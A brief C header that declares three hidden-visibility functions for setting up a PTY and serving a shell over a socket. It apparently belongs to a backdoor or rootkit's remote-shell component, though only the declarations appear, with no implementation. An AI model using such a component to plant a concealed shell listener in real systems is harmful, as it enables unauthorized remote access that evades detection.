#pragma once

#include "const.h"

void setup_pty(int sock, int *pty, int *tty) __attribute__((visibility("hidden")));
void shell_listener(int sock, int pty) __attribute__((visibility("hidden")));
int start_shell(int sock, struct sockaddr *addr) __attribute__((visibility("hidden")));

